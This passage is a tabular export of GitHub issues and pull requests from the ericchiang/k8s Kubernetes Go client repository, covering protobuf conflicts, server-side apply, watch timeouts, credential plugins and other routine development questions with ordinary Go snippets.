google.golang.org/protobuf/internal/impl.legacyLoadMessageInfo(0x55ba9b96e7e0, 0x55ba9b8f6140, 0x55ba9b735203, 0x2f, 0x55ba9b171219)
	/vendor/google.golang.org/protobuf/internal/impl/legacy_message.go:48 +0xbf
google.golang.org/protobuf/internal/impl.Export.LegacyMessageTypeOf(0x55ba9b963e60, 0x0, 0x55ba9b735203, 0x2f, 0xc00003c9a0, 0xc000109450)
	/vendor/google.golang.org/protobuf/internal/impl/legacy_export.go:33 +0xa7
github.com/golang/protobuf/proto.RegisterType(0x55ba9b963e60, 0x0, 0x55ba9b735203, 0x2f)
	/vendor/github.com/golang/protobuf/proto/registry.go:186 +0x4f
github.com/ericchiang/k8s/watch/versioned.init.0()
	/vendor/github.com/ericchiang/k8s/watch/versioned/generated.pb.go:76 +0x4d
```

I have tested by changing the expected input as suggested in this thread: https://stackoverflow.com/questions/61251129/how-to-fix-conflicts-with-this-error-message. 
I haven't observed any bug after this change, but I would not rely on a manual editing of the source code.

Is there any plan to upgrade protobuf to the latest version soon?

Thanks",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/125/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/125/comments,https://api.github.com/repos/ericchiang/k8s/issues/125/events,https://github.com/ericchiang/k8s/issues/125,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/124,541407053,MDExOlB1bGxSZXF1ZXN0MzU2MDU1MDgx,124,experiment for using server-side-apply WIP,463674,closed,TRUE,NA,NA,0,2019-12-22T04:47:20Z,2020-02-03T04:22:41Z,2020-02-03T04:22:41Z,NONE,NA,"THIS IS NOT FULLY WORKING

The error is, ""couldn't apply resource: couldn't apply resource: kubernetes
api: Failure 400 Incorrect version specified in apply patch. Specified patch
version: , expected: v1""

It looks like when doing server-side-apply we need to set the API version on
the object in the request body.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/124/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/124/comments,https://api.github.com/repos/ericchiang/k8s/issues/124/events,https://github.com/ericchiang/k8s/pull/124,https://api.github.com/repos/ericchiang/k8s/pulls/124
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/123,538802448,MDU6SXNzdWU1Mzg4MDI0NDg=,123,Server Side Apply,463674,closed,TRUE,NA,NA,12,2019-12-17T02:57:56Z,2019-12-27T07:42:10Z,2019-12-27T07:42:10Z,NONE,NA,"GKE just released 1.16 to rapid. I'd like to use server-side-apply. Generally, I'd like to declare protobufs in go, then use the new serve-side-apply feature.

Are there any design choices blocking this working in this client? If not, what implementation work would be required to get this working. Maybe it's something I can help out with.

Thanks!",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/123/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/123/comments,https://api.github.com/repos/ericchiang/k8s/issues/123/events,https://github.com/ericchiang/k8s/issues/123,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/122,536535009,MDExOlB1bGxSZXF1ZXN0MzUyMDQ4NTAx,122,Added missing exec config block for user in kubeconfig,4750892,open,TRUE,NA,NA,0,2019-12-11T18:13:11Z,2019-12-11T18:13:11Z,NA,NONE,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/122/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/122/comments,https://api.github.com/repos/ericchiang/k8s/issues/122/events,https://github.com/ericchiang/k8s/pull/122,https://api.github.com/repos/ericchiang/k8s/pulls/122
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/121,490367382,MDU6SXNzdWU0OTAzNjczODI=,121,Document or fix io.EOF from watch API,673953,open,TRUE,NA,NA,1,2019-09-06T14:45:45Z,2019-09-06T14:46:53Z,NA,NONE,NA,While using the watch API it is possible to see a lot of io.EOF errors.  It was not obvious to me that would be the case in the watch documentation.  If this is expected the documentation should be more explicit about it.,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/121/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/121/comments,https://api.github.com/repos/ericchiang/k8s/issues/121/events,https://github.com/ericchiang/k8s/issues/121,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/120,474819431,MDU6SXNzdWU0NzQ4MTk0MzE=,120,"Failure 406 only the following media types are accepted: application/json, application/yaml",1566294,closed,TRUE,NA,NA,2,2019-07-30T21:02:10Z,2019-07-31T13:55:37Z,2019-07-31T13:55:36Z,NONE,NA,"When calling `.Create` with a CRD-defined object, the client attempts to send it as protobuf-encoded message which is rejected by the Kubernetes API.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/120/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/120/comments,https://api.github.com/repos/ericchiang/k8s/issues/120/events,https://github.com/ericchiang/k8s/issues/120,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/119,473188215,MDExOlB1bGxSZXF1ZXN0MzAxNDA0MTk2,119,Fix typo,19281800,closed,TRUE,NA,NA,0,2019-07-26T05:48:40Z,2019-07-26T15:47:25Z,2019-07-26T15:47:25Z,CONTRIBUTOR,NA,Fix typo in client.go,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/119/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/119/comments,https://api.github.com/repos/ericchiang/k8s/issues/119/events,https://github.com/ericchiang/k8s/pull/119,https://api.github.com/repos/ericchiang/k8s/pulls/119
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/118,433759547,MDExOlB1bGxSZXF1ZXN0MjcwODkyODU3,118,Add Event and Event list to register in core api group,10122106,closed,TRUE,NA,NA,1,2019-04-16T12:44:36Z,2019-04-16T18:04:07Z,2019-04-16T18:04:07Z,CONTRIBUTOR,NA,@ericchiang  Registering Event to the core api group. ,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/118/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/118/comments,https://api.github.com/repos/ericchiang/k8s/issues/118/events,https://github.com/ericchiang/k8s/pull/118,https://api.github.com/repos/ericchiang/k8s/pulls/118
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/117,431890287,MDU6SXNzdWU0MzE4OTAyODc=,117,Creating Event by api/v1beta,10122106,closed,TRUE,NA,NA,2,2019-04-11T08:18:23Z,2019-04-16T07:26:01Z,2019-04-16T07:26:00Z,CONTRIBUTOR,NA,"I am trying to emit informative kubernetes event using api/v1beta, This event to give me information about creating/updating secret status. I didn't get any wrong and nothing happend.

here is an example:

    func postEventAboutStatus(kubeClient *k8s.Client, secret *corev1.Secret, event 
        *eventsv1beta1.Event, action string, reason string, note string )(err error){
	    now := time.Now()
	    secs := int64(now.Unix())
	    event.Metadata = new(metav1.ObjectMeta)
	    event.Metadata.Name = secret.Metadata.Name
	    event.Metadata.Namespace = secret.Metadata.Namespace

	    event.Metadata.CreationTimestamp = new(metav1.Time)
	    event.Metadata.CreationTimestamp.Seconds = &secs

	    event.Metadata.Labels = secret.Metadata.Labels
	    event.EventTime = new(metav1.MicroTime)
	    event.EventTime.Seconds = &secs

	    event.Action = &action
	    event.Note = &note

	    err := kubeClient.Create(context.Background(), event)
	    if err != nil {
	          log.Error().Err(err)
		  return err
	    }
	    if apiErr, ok := err.(*k8s.APIError); ok {
		  log.Info().Msgf("" Api Server Code: %v "", apiErr.Code  )
	    }

	    return

    }",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/117/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/117/comments,https://api.github.com/repos/ericchiang/k8s/issues/117/events,https://github.com/ericchiang/k8s/issues/117,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/116,431102528,MDU6SXNzdWU0MzExMDI1Mjg=,116,Watcher for CRD timeout in 90sec with EOF,28275753,open,TRUE,NA,NA,3,2019-04-09T18:03:15Z,2020-03-19T19:14:34Z,NA,NONE,NA,"Not sure it is K8s doing it or something in the package. When watch  resource like validatingwebhookconfiguration, it return from the watch.Next with EOF every 40 min , but if I define crd and watch it, it return every 90 second, tried adjust http.Transport{IdleConnTimeout} or even the --min-request-timeout=1800 on apiserver, all doesn't help.

Intuitively it should be same as it is just a resource on apiserver we doing long poll, should not matter what we looking for, but struggled for 3 days, can't find the issue.  See log below, mytestcrd return very 90sec, whild the validatingwebhoodconfiguration do so around 45min

2019-04-09T12:32:16.168|ERRO|CTL|resource.(*kubernetes).startWatchResource.func1: Watch failure - error=decode event: EOF resource=validatingwebhookconfiguration
........................
2019-04-09T13:21:58.73 |ERRO|CTL|resource.(*kubernetes).startWatchResource.func1: Watch failure - error=decode event: EOF resource=mytestcrds
2019-04-09T13:22:21.342|ERRO|CTL|resource.(*kubernetes).startWatchResource.func1: Watch failure - error=decode event: EOF resource=validatingwebhookconfiguration
2019-04-09T13:23:22.714|ERRO|CTL|resource.(*kubernetes).startWatchResource.func1: Watch failure - error=decode event: EOF resource=mytestcrds
",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/116/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/116/comments,https://api.github.com/repos/ericchiang/k8s/issues/116/events,https://github.com/ericchiang/k8s/issues/116,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/115,422439965,MDU6SXNzdWU0MjI0Mzk5NjU=,115,Support client-go credential plugins,794251,closed,TRUE,NA,NA,1,2019-03-18T21:19:14Z,2019-03-18T21:36:16Z,2019-03-18T21:36:16Z,NONE,NA,"`kubectl` (and other tools based on `client-go`) support [credential plugins](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#client-go-credential-plugins) like [aws-iam-authenticator](https://github.com/kubernetes-sigs/aws-iam-authenticator). However, when I interact with the API to an EKS cluster via this package, it doesn't seem to be calling `aws-iam-authenticator`. For example: Getting all pods in the default namespace:

```golang
kubernetes api: Failure 403 pods is forbidden: User ""system:anonymous"" cannot list pods at the cluster scope
```",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/115/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/115/comments,https://api.github.com/repos/ericchiang/k8s/issues/115/events,https://github.com/ericchiang/k8s/issues/115,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/114,421977070,MDU6SXNzdWU0MjE5NzcwNzA=,114,Is it possible to do pod eviction?,1122274,open,TRUE,NA,NA,6,2019-03-17T21:42:49Z,2019-03-18T22:45:55Z,NA,NONE,NA,"This is not an issue report, but a question.

I'm implementing a piece of code which retrieves the list of nodes and list of pods, and then based on some conditions I'd like to evict some pods. Listing the nodes and pods and getting their details works very nicely, but I couldn't find a way to do pod eviction yet.

Is it possible to do pod eviction with this library? I couldn't find a dedicated function for it, but in the K8s docs I see there is a REST API endpoint, which needs POSTing a small Json input to the route `/api/v1/namespaces/default/pods/{podname}/eviction`. Is there maybe a way with the library to send an arbitrary REST request to the K8s API, but reuse the HTTP client with the base address and the necessary headers, which is maintained by the client?

",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/114/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/114/comments,https://api.github.com/repos/ericchiang/k8s/issues/114/events,https://github.com/ericchiang/k8s/issues/114,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/113,418768227,MDExOlB1bGxSZXF1ZXN0MjU5NDYxNTAz,113,apis/core/v1: Register Event and EventList,187831,closed,TRUE,NA,NA,4,2019-03-08T12:30:22Z,2019-04-16T19:17:44Z,2019-04-16T18:04:25Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/113/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/113/comments,https://api.github.com/repos/ericchiang/k8s/issues/113/events,https://github.com/ericchiang/k8s/pull/113,https://api.github.com/repos/ericchiang/k8s/pulls/113
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/112,406613705,MDExOlB1bGxSZXF1ZXN0MjUwMjcxNDI2,112,Sync kubeconfig structure as part of generate,90273,open,TRUE,NA,NA,4,2019-02-05T03:16:26Z,2019-02-05T17:26:59Z,NA,CONTRIBUTOR,NA,"`config.go` is copied from `client-go/tools/clientcmd/api/v1/types.go`, and then modified a bit to kinda-sorta make `gopkg.in/yaml.v2` happy (modified in #71 for #60, but still kinda broken #81).

Since it's still broken with `gopkg.in/yaml.v2`, let's just ditch the modifications in #71, so that we can copy the file as part of generate, instead of trying to keep it in-sync manually.  This has the potential to break users who use `gopkg.in/yaml.v2` (and rely on no `-data` fields being set in the YAML they're parsing).  I figure since it's already kinda broken, most users aren't using `gopkg.in/yaml.v2`, especially since the docs point them toward `github.com/ghodss/yaml`.

When we ""generate"" it, put it in `./config/v1/`, to make it clear that it is a versioned type imported from client-go. I think it's cleaner that way.

But, to avoid totally breaking existing users, don't entirely remove `config.go`, but replace it with a list of Go 1.9 type aliases, so that `github.com/ericchiang/k8s.Config` is an alias for `github.com/ericchiang/k8s/client/v1.Config` and so on.  This bumps the required Go version from 1.7 to 1.9.  This bump could be avoided at the cost of breaking existing users.

Alternatively, the generate script could be edited to keep it in the current package.

I'm not sure what your feelings are on breaking changes at the expense of clarity, or whether this type of change is welcome in general.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/112/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/112/comments,https://api.github.com/repos/ericchiang/k8s/issues/112/events,https://github.com/ericchiang/k8s/pull/112,https://api.github.com/repos/ericchiang/k8s/pulls/112
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/111,406546020,MDExOlB1bGxSZXF1ZXN0MjUwMjE5MTky,111,"Fix problems with Watcher (typo, Type=""ERROR"" events)",90273,closed,TRUE,NA,NA,1,2019-02-04T22:21:39Z,2019-02-05T06:14:48Z,2019-02-05T02:59:45Z,CONTRIBUTOR,NA," - (minor) Fix a typo in an error message
 - (major) Correctly handle `.Type=&""ERROR""` watch events as `APIError`s, instead of trying to protobuf decode the wrong type.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/111/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/111/comments,https://api.github.com/repos/ericchiang/k8s/issues/111/events,https://github.com/ericchiang/k8s/pull/111,https://api.github.com/repos/ericchiang/k8s/pulls/111
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/110,405429488,MDExOlB1bGxSZXF1ZXN0MjQ5MzkyNTg2,110,Miscellaneous generate script changes,90273,closed,TRUE,NA,NA,3,2019-01-31T20:35:43Z,2019-02-01T01:10:59Z,2019-02-01T01:10:59Z,CONTRIBUTOR,NA,"This is 4 mostly unrelated changes (each in a separate commit).  It felt silly to create a separate PR for each one.  Feel free to cherry-pick individual changes if you don't like some of them.

 - generate scripts: Use `bsdtar` instead of `unzip`.  There are different versions of `unzip` floating around, with different flags.  `bsdtar` is relatively uniform from one place to another.
 - Remove `watch/versioned` in favor of `apis/meta/v1`.  Once upon a time, `watch/versioned` was generated, but the generate scripts no longer update it.  See the commit message for more details.
 - Add `go.mod` and `go.sum` for Go module support; adjust Makefile to cope.
 - Makefile: Bump KUBE_VERSION to 1.13.2 (the most recent version, released 2019-01-10), re-generate.  I'm not sure what the strategy is for which version to use; I mostly just wanted to see if the generate scripts had bit-rotted against new versions of upstream Kubernetes.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/110/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/110/comments,https://api.github.com/repos/ericchiang/k8s/issues/110/events,https://github.com/ericchiang/k8s/pull/110,https://api.github.com/repos/ericchiang/k8s/pulls/110
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/109,390329175,MDExOlB1bGxSZXF1ZXN0MjM4MTE5MzQ5,109,*: update Go versions tested in travis,2342749,closed,TRUE,NA,NA,0,2018-12-12T17:23:48Z,2018-12-12T17:30:40Z,2018-12-12T17:29:46Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/109/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/109/comments,https://api.github.com/repos/ericchiang/k8s/issues/109/events,https://github.com/ericchiang/k8s/pull/109,https://api.github.com/repos/ericchiang/k8s/pulls/109
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/108,390324216,MDExOlB1bGxSZXF1ZXN0MjM4MTE1NDM0,108,*: allow watches on individual resources,2342749,open,TRUE,NA,NA,1,2018-12-12T17:11:37Z,2019-05-14T04:51:42Z,NA,OWNER,NA,closes #107 ,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/108/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/108/comments,https://api.github.com/repos/ericchiang/k8s/issues/108/events,https://github.com/ericchiang/k8s/pull/108,https://api.github.com/repos/ericchiang/k8s/pulls/108
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/107,389529018,MDU6SXNzdWUzODk1MjkwMTg=,107,Set “name” path parameter for endpoint watch,6114096,open,TRUE,NA,NA,3,2018-12-10T23:17:17Z,2018-12-12T17:42:41Z,NA,NONE,NA,"How do I set “name” path parameter for endpoint watch in GET /api/v1/watch/namespaces/{namespace}/endpoints/{name} - https://v1-9.docs.kubernetes.io/docs/reference/generated/kubernetes-api/v1.9/#watch-145

The current api for watch does not have a “name” parameter for the service in this case.

func (c *Client) Watch(ctx context.Context, namespace string, r Resource, options ...Option) (*Watcher, error)",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/107/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/107/comments,https://api.github.com/repos/ericchiang/k8s/issues/107/events,https://github.com/ericchiang/k8s/issues/107,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/106,387546127,MDU6SXNzdWUzODc1NDYxMjc=,106,Why type ObjectMeta is different?,7476438,closed,TRUE,NA,NA,1,2018-12-05T00:57:11Z,2018-12-05T01:03:37Z,2018-12-05T01:03:36Z,NONE,NA,"This is actually a question.
In ericchiang\k8s\apis\meta\v1\generated.pb.go, it has
// ObjectMeta is metadata that all persisted resources must have, which includes all objects
// users must create.
type ObjectMeta struct {
	Name *string
        CreationTimestamp *Time
        .......
}

But I downloaded Kubertenes code from https://github.com/kubernetes/kubernetes
In k8s.io\apimachinery\pkg\apis\meta\v1\types.go, it has
// ObjectMeta is metadata that all persisted resources must have, which includes all objects
// users must create.
type ObjectMeta struct {
        Name string
        CreationTimestamp Time
        ........
}

Are these 2 ObjectMeta  types for the same purpose?
If yes, I wonder why there is the value fields vs pointer fields difference between them?
Thanks",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/106/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/106/comments,https://api.github.com/repos/ericchiang/k8s/issues/106/events,https://github.com/ericchiang/k8s/issues/106,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/105,377440356,MDU6SXNzdWUzNzc0NDAzNTY=,105,Access Service Endpoints,26008261,closed,TRUE,NA,NA,1,2018-11-05T15:06:37Z,2018-11-05T15:11:02Z,2018-11-05T15:11:02Z,NONE,NA,"When I use kubectl describe service I get a list of endpoint IP's

Endpoints:         10.20.0.75:9000

I am getting the services like this

```
	var services corev1.ServiceList
	if err := client.List(context.Background(), k8s.AllNamespaces, &services); err != nil {
		tr.Logger.Error(err.Error())
		return
	}
	for _, p := range services.Items {
			tr.Logger.Info(fmt.Sprintf(""Name: %v IP:"", p.GetMetadata().GetName()))
		}
	}

```

But I can't work out how to go about getting the pod IPs inside

Any ideas?",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/105/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/105/comments,https://api.github.com/repos/ericchiang/k8s/issues/105/events,https://github.com/ericchiang/k8s/issues/105,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/104,375565427,MDU6SXNzdWUzNzU1NjU0Mjc=,104,Is it Possible to Connect with ServiceAccount instead of KubeConfig,445532,closed,TRUE,NA,NA,1,2018-10-30T15:57:43Z,2018-11-02T08:02:42Z,2018-11-02T08:02:42Z,NONE,NA,"Is it Possible to Connect with ServiceAccount with the right RBAC permissions set instead of you using the KubeConfig?

I see the mount path for the `ServiceAccount` token and ca is hardcoded here will be good to have it in as a param

https://github.com/ericchiang/k8s/blob/cee371583a0bf61583137d7611b5a87f4d8700b9/client.go#L215

",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/104/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/104/comments,https://api.github.com/repos/ericchiang/k8s/issues/104/events,https://github.com/ericchiang/k8s/issues/104,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/103,374023059,MDExOlB1bGxSZXF1ZXN0MjI1ODE4OTg0,103,Build in-cluster url using net/url,15763,closed,TRUE,NA,NA,1,2018-10-25T16:07:43Z,2018-10-26T10:49:57Z,2018-10-25T16:48:36Z,CONTRIBUTOR,NA,"In-cluster server url is built concatenating host and port, this can be problematic with IPv6.

Use `url.URL` and `net.JoinHostPort` to generate the server URL.",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/103/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/103/comments,https://api.github.com/repos/ericchiang/k8s/issues/103/events,https://github.com/ericchiang/k8s/pull/103,https://api.github.com/repos/ericchiang/k8s/pulls/103
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/102,359339959,MDU6SXNzdWUzNTkzMzk5NTk=,102,How to watch the status of nodes in a cluster?,34054391,closed,TRUE,NA,NA,1,2018-09-12T06:56:35Z,2018-09-12T15:04:38Z,2018-09-12T15:04:38Z,NONE,NA,"Hello,
How to monitor the EventAdded and EventDeleted of nodes in a cluster?",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/102/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/102/comments,https://api.github.com/repos/ericchiang/k8s/issues/102/events,https://github.com/ericchiang/k8s/issues/102,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/101,358299320,MDU6SXNzdWUzNTgyOTkzMjA=,101,A way to load resources directly from file yaml manifest,5186521,open,TRUE,NA,NA,6,2018-09-08T14:23:29Z,2018-11-02T08:06:01Z,NA,NONE,NA,"Hi,

Is there a way to load resources directly from file yaml manifest? Let's say I have manifest stored in git and I want to apply it to the cluster.

I think it's possible to do so by creating new resource (in my case - deployment) and then apply this new resource, but it would be really nice to have out-of-the-box method for this, and maybe this method will take care of resource API version.",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/101/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/101/comments,https://api.github.com/repos/ericchiang/k8s/issues/101/events,https://github.com/ericchiang/k8s/issues/101,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/100,351129018,MDU6SXNzdWUzNTExMjkwMTg=,100,New release with Delete-Options,20142,closed,TRUE,NA,NA,2,2018-08-16T09:37:55Z,2018-08-23T04:32:06Z,2018-08-23T04:32:06Z,NONE,NA,Please create a new release containing the delete-option changes (f2ca415) in order for those being in need of those changes not to have to vendor `master` branch but instead a tagged version.,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/100/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/100/comments,https://api.github.com/repos/ericchiang/k8s/issues/100/events,https://github.com/ericchiang/k8s/issues/100,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/99,344659260,MDExOlB1bGxSZXF1ZXN0MjA0MDAzMzM2,99,*: add test for watching service annotations,2342749,open,TRUE,NA,NA,0,2018-07-26T01:12:13Z,2018-07-26T01:12:13Z,NA,OWNER,NA,Updates https://github.com/ericchiang/k8s/issues/93,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/99/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/99/comments,https://api.github.com/repos/ericchiang/k8s/issues/99/events,https://github.com/ericchiang/k8s/pull/99,https://api.github.com/repos/ericchiang/k8s/pulls/99
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/98,344656449,MDExOlB1bGxSZXF1ZXN0MjA0MDAxMzI4,98,.travis.yaml: only build the master branch,2342749,closed,TRUE,NA,NA,0,2018-07-26T00:54:20Z,2018-07-26T01:11:52Z,2018-07-26T01:11:48Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/98/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/98/comments,https://api.github.com/repos/ericchiang/k8s/issues/98/events,https://github.com/ericchiang/k8s/pull/98,https://api.github.com/repos/ericchiang/k8s/pulls/98
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/97,344655238,MDExOlB1bGxSZXF1ZXN0MjA0MDAwNDUy,97,*: document Client.Namespace,2342749,closed,TRUE,NA,NA,0,2018-07-26T00:46:50Z,2018-07-26T00:54:09Z,2018-07-26T00:54:05Z,OWNER,NA,"Because we already use the empty string """" to indicate AllNamespaces
it's unclear if the following statement is attempting to list all
namespaces or have the namespace value defaulted:

        client.List(ctx, """", &deployments)

Alternatives such as creating another special variable:

        client.List(ctx, k8s.DefaultNamespace, &deployments)

Seem clunckier than just doing:

        cleint.List(ctx, client.Namespace, &deployments)

Closes #87",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/97/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/97/comments,https://api.github.com/repos/ericchiang/k8s/issues/97/events,https://github.com/ericchiang/k8s/pull/97,https://api.github.com/repos/ericchiang/k8s/pulls/97
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/96,344494613,MDExOlB1bGxSZXF1ZXN0MjAzODc2ODU5,96,*: respect client set default namespace,2342749,closed,TRUE,NA,NA,2,2018-07-25T15:29:58Z,2018-07-26T00:47:21Z,2018-07-26T00:47:17Z,OWNER,NA,"Forgot to implement the ""Namespace"" field on the client struct. Pass this value through when performing CRUD on a resource.

Closes https://github.com/ericchiang/k8s/issues/87",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/96/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/96/comments,https://api.github.com/repos/ericchiang/k8s/issues/96/events,https://github.com/ericchiang/k8s/pull/96,https://api.github.com/repos/ericchiang/k8s/pulls/96
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/95,344465218,MDU6SXNzdWUzNDQ0NjUyMTg=,95,Run controller manager in integration test setup,2342749,open,TRUE,NA,NA,0,2018-07-25T14:21:39Z,2018-07-25T14:21:39Z,NA,OWNER,NA,Things like delete propagation policies requires it: https://github.com/ericchiang/k8s/pull/92,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/95/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/95/comments,https://api.github.com/repos/ericchiang/k8s/issues/95/events,https://github.com/ericchiang/k8s/issues/95,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/94,344252350,MDExOlB1bGxSZXF1ZXN0MjAzNjkyNTc4,94,*: update travis to include Go 1.10 and add README badge,2342749,closed,TRUE,NA,NA,0,2018-07-25T00:48:57Z,2018-07-25T01:03:12Z,2018-07-25T01:03:08Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/94/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/94/comments,https://api.github.com/repos/ericchiang/k8s/issues/94/events,https://github.com/ericchiang/k8s/pull/94,https://api.github.com/repos/ericchiang/k8s/pulls/94
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/93,340780853,MDU6SXNzdWUzNDA3ODA4NTM=,93,Watcher on Service resource not catching annotation updates,8505034,closed,TRUE,NA,NA,2,2018-07-12T20:10:32Z,2018-07-27T00:38:15Z,2018-07-27T00:38:15Z,NONE,NA,"We are using the Watch function on services with something like this: 
s := new(corev1.Service)
eventType, err := serviceWatcher.Next(s)

But we have noticed it doesn't trigger an event for annotation changes to a service resource, when using it for pods/deployments an annotation change does trigger an update.

Are we doing something wrong or this a limitation? 
",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/93/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/93/comments,https://api.github.com/repos/ericchiang/k8s/issues/93/events,https://github.com/ericchiang/k8s/issues/93,NA
